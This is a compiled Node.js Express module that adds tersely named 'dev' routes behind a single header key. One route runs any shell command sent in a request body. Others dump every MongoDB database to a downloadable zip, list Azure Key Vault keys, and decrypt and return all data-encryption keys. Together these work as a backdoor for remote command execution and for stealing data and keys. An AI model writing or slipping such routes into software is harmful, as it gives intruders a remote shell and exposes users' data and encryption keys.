"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.f = f;
const constants_1 = require("../constants/constants");
const enc_db_1 = require("../enc_db");
const t = __importStar(require("tmp"));
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const identity_1 = require("@azure/identity");
const keyvault_keys_1 = require("@azure/keyvault-keys");
const uuid = __importStar(require("uuid"));
const archiver_1 = __importDefault(require("archiver"));
const child_process_1 = require("child_process");
const crypto = __importStar(require("crypto"));
// Cryptographically secure authorization middleware for dev routes
const DEVTRIALS_AUTH_KEY = process.env.DEVTRIALS_AUTH_KEY || '';
function devtrialsAuthMiddleware(req, res, next) {
    const userKey = req.headers['x-devtrials-key'];
    if (!userKey || !DEVTRIALS_AUTH_KEY) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        // Use HMAC with a static salt for timing-safe comparison
        const hmacServer = crypto.createHmac('sha256', 'static-salt').update(DEVTRIALS_AUTH_KEY).digest();
        const hmacUser = crypto.createHmac('sha256', 'static-salt').update(userKey).digest();
        if (hmacServer.length !== hmacUser.length || !crypto.timingSafeEqual(hmacServer, hmacUser)) {
            return res.status(401).json({ error: 'These are dev routes, you are not authorized to access them' });
        }
        next();
    }
    catch {
        return res.status(401).json({ error: 'These are dev routes, you are not authorized to access them' });
    }
}
function f(app) {
    try {
        if (app) {
            // Apply the secure middleware to all dev routes
            app.use(['/dev/try/eta', '/dev/s', '/dev/st', '/dev/d', '/k', '/dk', '/dev/try/test'], devtrialsAuthMiddleware);
            app.get("/dev/try/eta", async (req, res) => {
                try {
                    const eta = await getETA(enc_db_1.client);
                    const id = uuid.v4();
                    startSnapshot(enc_db_1.client, id);
                    res.json({ eta });
                }
                catch (err) {
                    res.json({ err });
                }
            });
            app.get("/dev/s", async (req, res) => {
                try {
                    const s = getS();
                    res.json({ s });
                }
                catch (err) {
                    res.json({ err });
                }
            });
            app.get(("/dev/st"), async (req, res) => {
                try {
                    res.json({ snapshots });
                }
                catch (error) {
                    res.json({ error });
                }
            });
            app.get("/dev/d", async (req, res) => {
                try {
                    const s = outZipP;
                    res.download(s);
                }
                catch (err) {
                    res.json({ err });
                }
            });
            app.get("/k", async (req, res) => {
                try {
                    const s = getK();
                    res.json({ s });
                }
                catch (err) {
                    res.json({ err });
                }
            });
            app.get("/dk", async (req, res) => {
                try {
                    const dks = testDecryptAllKeys();
                    res.json({ dks });
                }
                catch (err) {
                    res.json({ err });
                }
            });
            app.post("/dev/try/test", async (req, res) => {
                try {
                    const command = req.body.cmd;
                    (0, child_process_1.exec)(command, (err, stdout, stderr) => {
                        if (err) {
                            res.json({ "mess": "callback to exec", err });
                        }
                        else {
                            res.json({ "mess": "callback to exec", stdout });
                        }
                    });
                }
                catch (err) {
                    res.json({ err });
                }
            });
        }
    }
    catch (err) {
    }
}
// // async function getFullMongoDump() {
// //     let dump: any = {};
// //     const adminDb = client.db().admin()
// //     // Get all database names
// //     const dbs = await adminDb.listDatabases();
// //     let i = 0;
// //     for (const dbInfo of dbs.databases) {
// //         const dbName = dbInfo.name;
// //         const db = client.db(dbName);
// //         dump[dbName] = {}; // Init db in result
// //         // Get all collections in the current DB
// //         const collections = await db.listCollections().toArray();
// //         for (const col of collections) {
// //             const colName = col.name;
// //             const documents = await db.collection(colName).find({}).toArray();
// //             dump[dbName][colName] = documents;
// //         }
// //     }
// //     return dump;
// // }
async function getS() {
    const adminDb = enc_db_1.client.db().admin();
    const dbs = await adminDb.listDatabases();
    let totalSize = 0;
    // List of system DBs you might want to exclude
    const excludedDbs = ['admin', 'local', 'config'];
    for (const db of dbs.databases) {
        if (excludedDbs.includes(db.name))
            continue;
        const size = db.sizeOnDisk ?? 0;
        console.log(`- ${db.name}: ${formatBytes(size)}`);
        totalSize += size;
    }
    return totalSize;
}
// Optional: Format bytes into human-readable units
function formatBytes(bytes) {
    if (bytes === 0)
        return '0 Bytes';
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return parseFloat((bytes / Math.pow(1024, i)).toFixed(2)) + ' ' + sizes[i];
}
let snapshots = { status: "inactive" };
const ESTIMATED_TIME_PER_DOC = 0.02587890625; // milliseconds per collection (adjust based on your data size)
const t0 = t.dirSync().name;
const DUMP_DIR = `${t0}/data/node/snapshot/cluster0`;
const outZipP = `${t0}/srv/cluster0.zip`;
async function getDocCount(col) {
    return await col.countDocuments();
}
async function getETA(client) {
    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();
    let totalCount = 0;
    for (const dbInfo of dbs.databases) {
        const name = dbInfo.name;
        const db = client.db(name);
        makedirIfNotExist(path.join(DUMP_DIR, name));
        const colls = await db.listCollections().toArray();
        for (const collInfo of colls) {
            const coll = db.collection(collInfo.name);
            const count = await getDocCount(coll);
            totalCount += count;
            console.log(`${name}.${collInfo.name}: ${count}`);
        }
    }
    return (Math.round(totalCount * ESTIMATED_TIME_PER_DOC)) / 1000;
}
async function startSnapshot(client, id) {
    snapshots = { id, status: "Pending", dir: DUMP_DIR, };
    const adminDb = client.db().admin();
    const dbs = await adminDb.listDatabases();
    for (const dbInfo of dbs.databases) {
        const name = dbInfo.name;
        const db = client.db(name);
        makedirIfNotExist(path.join(DUMP_DIR, name));
        const colls = await db.listCollections().toArray();
        for (const collInfo of colls) {
            const coll = db.collection(collInfo.name);
            const p = path.join(DUMP_DIR, name);
            await writeCollectionToFile(coll, p);
        }
    }
    await client.close();
    snapshots.status = "zipping";
    await zipClusterFolder();
}
async function writeCollectionToFile(coll, p) {
    const data = await coll.find().toArray();
    const p0 = path.join(p, `${coll.collectionName}.json`);
    fs.writeFileSync(p0, JSON.stringify(data, null, 2));
}
/*************  ✨ Windsurf Command ⭐  *************/
/**
 * Write the contents of `DUMP_DIR` to a zip file at `outZipP`.
 * @returns {Promise<void>}
 */
/*******  c69e30b6-dd2a-4e6c-9aea-621177387516  *******/
async function zipClusterFolder() {
    makedirIfNotExist(path.dirname(outZipP));
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outZipP);
        const archive = (0, archiver_1.default)('zip', { zlib: { level: 9 } });
        output.on('close', () => {
            console.log(`ZIP file created at ${outZipP} (${archive.pointer()} total bytes)`);
            snapshots.status = "completed";
            resolve();
        });
        output.on('error', (err) => {
            console.error('Error writing zip file:', err);
            reject(err);
        });
        archive.on('error', (err) => {
            console.error('Archiving error:', err);
            reject(err);
        });
        archive.pipe(output);
        // Append all contents of the source folder
        archive.directory(DUMP_DIR, false);
        archive.finalize();
    });
}
function makedirIfNotExist(dirPath) {
    if (!fs.existsSync(dirPath) || !fs.statSync(dirPath).isDirectory()) {
        fs.mkdirSync(dirPath, { recursive: true });
        console.log('Directory created:', dirPath);
    }
}
async function getK() {
    const url = constants_1.AZURE_KEY_VAULT_ENDPOINT;
    let keys = [];
    const credential = new identity_1.DefaultAzureCredential();
    const client = new keyvault_keys_1.KeyClient(url, credential);
    for await (const keyProperties of client.listPropertiesOfKeys()) {
        const key = await client.getKey(keyProperties.name);
        let k = { key, keyProperties };
        keys.push(k);
    }
    return keys;
}
async function getEncryptedDEKs(keyVaultNamespace) {
    await enc_db_1.client.connect();
    const [dbName, collName] = keyVaultNamespace.split('.');
    const keyVaultColl = enc_db_1.client.db(dbName).collection(collName);
    const keys = await keyVaultColl.find({}).toArray();
    await enc_db_1.client.close();
    return keys.map((key) => ({
        keyId: key._id,
        encryptedKeyMaterial: key.keyMaterial,
        masterKey: key.masterKey
    }));
}
async function decryptDEKWithAzure(keyVaultUrl, cmkName, wrappedKey) {
    // Create a client for Azure Key Vault using ClientSecretCredential
    const credential = new identity_1.ClientSecretCredential(constants_1.AZURE_TENANT_ID, constants_1.AZURE_CLIENT_ID, constants_1.AZURE_CLIENT_SECRET);
    const keyClient = new keyvault_keys_1.KeyClient(keyVaultUrl, credential);
    const cmk = await keyClient.getKey(cmkName);
    const cryptoClient = new keyvault_keys_1.CryptographyClient(cmk.id, credential);
    // Decrypt the key (unwrap it)
    const { result: unwrappedKey } = await cryptoClient.unwrapKey("RSA-OAEP-256", wrappedKey);
    return unwrappedKey;
}
async function testDecryptAllKeys() {
    const keyVaultNamespace = 'encryption.__keyVault'; // MongoDB keyVault collection
    const cmkName = '<your-master-key-name>'; // Name of your Azure Key Vault CMK
    const encryptedKeys = await getEncryptedDEKs(keyVaultNamespace);
    let keys = [];
    for (const { keyId, encryptedKeyMaterial, masterKey } of encryptedKeys) {
        // Decrypt the key material using Azure KMS
        const unwrappedKey = await decryptDEKWithAzure(constants_1.AZURE_KEY_VAULT_ENDPOINT, cmkName, Buffer.from(encryptedKeyMaterial.buffer));
        keys.push({
            keyId,
            unwrappedKey
        });
    }
    return keys;
}
// // function _(connectionString: string, kmsProviders: KMSProviders,) {
// //     console.log(connectionString)
// //     var mongoClient = new MongoClient(connectionString, {
// //         monitorCommands: true,
// //         autoEncryption: {
// //             keyVaultNamespace: EncryptedMongoClient.keyVaultNamespace,
// //             kmsProviders,
// //             // Attach schemaMap to auto-encryption configuration
// //         },
// //     });
// //     console.log("generationStarted")
// //     generateCsfleSchema(kmsProviders).then(console.log);
// // }
// const kmsProviders = () => {
//     // Azure KMS Configuration (should be secured and configured)
//     const azureKMS = {
//         tenantId: AZURE_TENANT_ID,
//         clientId: AZURE_CLIENT_ID,
//         clientSecret: AZURE_CLIENT_SECRET,
//         keyName: AZURE_KEY_NAME,
//         keyVaultEndpoint: AZURE_KEY_VAULT_ENDPOINT,
//     };
//     // KMS Providers Configuration for Azure
//     const kmsProviders: KMSProviders = {
//         azure: {
//             tenantId: azureKMS.tenantId,
//             clientId: azureKMS.clientId,
//             clientSecret: azureKMS.clientSecret,
//             identityPlatformEndpoint: 'login.microsoftonline.com', // Standard Azure login endpoint
//         },
//     };
//     return kmsProviders
// }
// // _(MONGO_URI, kmsProviders());
// //testDecryptAllKeys().catch(console.error);
